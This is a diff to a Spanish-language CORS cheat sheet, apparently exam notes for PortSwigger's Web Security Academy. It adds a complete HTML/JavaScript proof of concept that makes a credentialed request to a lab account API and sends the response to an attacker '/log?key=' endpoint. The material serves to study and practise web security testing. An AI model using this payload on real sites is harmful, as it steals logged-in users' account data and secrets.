@@ -23,7 +23,23 @@ Cheat Sheet:
     
 6. **Prueba de Protocolo (HTTP):** Envía `Origin: [http://dominio-objetivo.com](http://dominio-objetivo.com)` (sin la 's'). Si el servidor permite HTTP, asume un riesgo de seguridad en texto plano, lo cual abre la puerta a vectores de red (aunque es menos común explotarlo en la certificación de PortSwigger).
 
----
+
+<html>
+        <body>
+                <script>
+   var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0a6600a803b2228e800a7b2e00750095.web-security-academy.net/account-api/?unixTimestamp='+Date.now(),true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+        </body>
+</html>
+
 ##### CORS Template
 
 *  `/AccountDetails`
